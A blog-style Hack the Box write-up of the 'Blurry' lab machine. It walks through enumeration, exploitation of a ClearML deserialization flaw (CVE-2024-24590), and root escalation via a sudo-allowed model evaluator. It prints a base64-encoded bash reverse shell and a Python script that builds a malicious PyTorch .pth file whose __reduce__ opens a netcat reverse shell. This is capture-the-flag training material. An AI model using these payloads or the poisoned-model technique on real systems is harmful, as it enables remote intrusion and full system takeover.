---
draft: false
title: "Hack the Box #5 - Blurry without Metasploit"
date: 2024-08-20
author: William
category:
  - Tech
tags:
  - Linux
  - Security
  - Hacking
cover:
  image: hack_the_box_5_blurry.png
  alt: hack_the_box_5_blurry.png
---

I woke up this morning breathed in that sweet morning air. I could feel it, to days the day ima hack a box and come to the sun setting I had pwned this box by getting an AI model to execute a reverse shell that got me root! Here we go

![ChewingStraw](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExamtrYXIyajJ5NjFtNzRzc25mdmQzbTFsNG9xamtqbHJpZXZudXhydyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/lqqB7E9CdSG76/200.gif#center)

---
## Enumeration
What can nmap tell us about this target

```bash
└─$ nmap -A -p- 10.10.11.19 -oN nmap.scan
# Nmap 7.94SVN scan initiated Sat Aug 10 11:14:11 2024 as: nmap -A -p- -oN nmap.scan 10.10.11.19
Nmap scan report for 10.10.11.19
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to <http://app.blurry.htb/>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Sat Aug 10 11:14:36 2024 -- 1 IP address (1 host up) scanned in 25.45 seconds

```

Lets add `app.blurry.htb` to our hosts file and run some subdomain enumeration tool to see what else is out there


```bash
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.19 -H "HOST: FUZZ.blurry.htb" -ac -o ffuf.scan

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
_______________________________________________

...
app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 11ms]
files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 21ms]
chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 56ms]
```


So we have `app` , `files` and `chat` as subdomains. Adding these to the hosts file lets enumerate each of these for their sub directories.

I went ahead and dug around with both gobuster and manually exploring. When going to `app.blurry.htb` we get taken to an webapp and are prompted to create an account. Which I do, called `Deez` and poke around.

---
## Exploitation
In the investigation we find the `app` subdomain is running an app called **clear.ml** and with some trusty googling we find this vuln [https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit) to execute this script first we need to create credentials on our clear.ml account. 
![keys](https://i.imgur.com/457thdA.png#center)

Once that is done and the subdomain `api` is added to the hosts file we configure the exploit.
```bash
└──$ python3 exploit.py                                                    
                                           
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⠄⠄⠄⠄⣠⣴⣶⣾⣿⣿⣿⣷⣶⣤⣀⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⠄⢀⣴⣿⣿⣿⡿⠿⠟⠛⠻⠿⣿⣿⣿⡷⠆⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⢠⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠉⠛⠁⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⢠⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⢸⣿⣿⡇⠄⠄⠄⠄⣠⣾⠿⢿⡶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⢸⣿⣿⣿⣿⡇⠄⠄⠄⠄⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⣿⣿⣿⣿⣷⡀⠄⠄⠄⠙⠿⣶⡾⠟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠘⣿⣿⣿⣿⣷⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠘⢿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣠⣤⣴⣿⣿⣷⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⠄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⠄⠄⠄⠈⠛⠻⠿⣿⣿⡏⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                      
CVE-2024-24590 - ClearML RCE
============================
[1] Initialize ClearML
[2] Run exploit
[0] Exit
[>] Choose an option: 1
[+] Creating a copy of clearml.conf in clearml.conf.bak
[+] Initializing ClearML
[i] Press enter after pasting the configuration
...
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb
...
ClearML setup completed successfully.

```

Now we are primed for attack and it is time to pounce 

![pounce](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExb3JleDdvcjRmcXIweGN0bXkzajQwZ3BzaW1ja2x4MWV0MGQ3eWUwaiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/26h0qOq4LxV8YcDKw/giphy.gif#center)


```bash
└─$ python3 exploit.py
...
============================
[1] Initialize ClearML
[2] Run exploit
[0] Exit
[>] Choose an option: 2
[+] Your IP: 10.10.14.62
[+] Your Port: 1234
[+] Target Project name Case Sensitive!: Black Swan
[+] Payload to be used: echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42Mi8xMjM0IDA+JjEi | base64 -d | sh
[?] Do you want to start a listener on 1234? (y/n): y
[+] pwncat listener started on 1234
[i] This exploit requires that another user deserializes the payload on their machine.
ClearML Task: created new task id=3df2aa3a66144bbbbdba441a8689b4ed
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/3df2aa3a66144bbbbdba441a8689b4ed/output/log
[i] Please wait...
ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
bash: cannot set terminal process group (220630): Inappropriate ioctl for device
bash: no job control in this shell
jippity@blurry:~$ 

```

And after a little wait for the ML model to execute we get a lovely call home, which leads us nicely to the first user flag and poking around the user profile we find a SSH key which helps us keep persistence on our target.
```bash
jippity@blurry:~$ cat user.txt
================ USER_FLAG ================
jippity@blurry:~$ cat /.ssh/id_rsa
=============== PRIVATE_KEY ===============
_________________________________________
└─$ ssh -i id_rsa jippity@10.10.11.19
jippity@blurry:~$ 
```

---
## Privilege Escalation

With persistence achieved it is time to escalate to root. Transferring over linpeas using our newly acquired private key we can get a broadview of what vectors to escalation we have available to us. 

```bash
└─$ scp -i /home/kali/.ssh/id_rsa ./linpeas.sh jippity@10.10.11.19:~/
_______________________________________________________________________
jippity@blurry:~$ linpeas.sh
...
User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
...
```

Looking through linpeas findings one thing stands out as interesting. There is a program `/usr/bin/evaluate_model` that when executed will be run as root and it doesn't require a password to do so. Taking a closer look at the script in question it looks to only take .pth files.
A .pth file is a compiled AI model file that is used by [PyTorch to save and load models](https://pytorch.org/tutorials/beginner/saving_loading_models.html). So in theory if we can create our own malicious model we can get this script to execute the malicious model and use it to escalate.

Here is the script ill be using:
```python
import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
    # PyTorch's base class for all neural network modules
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.dense = nn.Linear(10, 1)
    
    # Define how the data flows through the model
    def forward(self, abdulrahman): # Passes input through the linear layer.
        return self.dense(abdulrahman)
   
    # Overridden __reduce__ Method
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.46 6060 >/tmp/f"
        return os.system, (cmd,)

# Create an instance of the model
malicious_model = MaliciousModel()

# Save the model using torch.save
torch.save(malicious_model, 'callhome.pth')
```

**Explanation of the Script**:

- **`MaliciousModel` Class**: Defines a simple neural network model.
- **`__reduce__ Method`**: Overridden to include a command that creates a reverse shell using netcat.
- **`torch.save` Function**: Saves the model to a file named `.callhome.pth`.

Pushing this onto the box and we pass the malicious model to the `evaluate_model` script as follows and wait...
```bash
jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/callhome.pth 
```

Looking to our netcat awaiting in the wings with baited breath... SHELL!!!
```Bash
# whoami
root
# cat /root/root.txt
================= ROOT_FLAG =================
```

And that is root baby! WINNING!!! And I get my [rubber stamp of approval](https://www.hackthebox.com/achievement/machine/1695260/605) from Hack the Box as a reward.  Now that I can say with confidence I have hacked an AI model I'm going to go touch some grass :D

![touchGrass](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExdWt0Z3Z5a2R6ODhpM2h1azVqNTExazE1MHVqMms5amZzbGwzdzBsbCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VlYBM5zERKWD5ONSzi/giphy.gif#center)


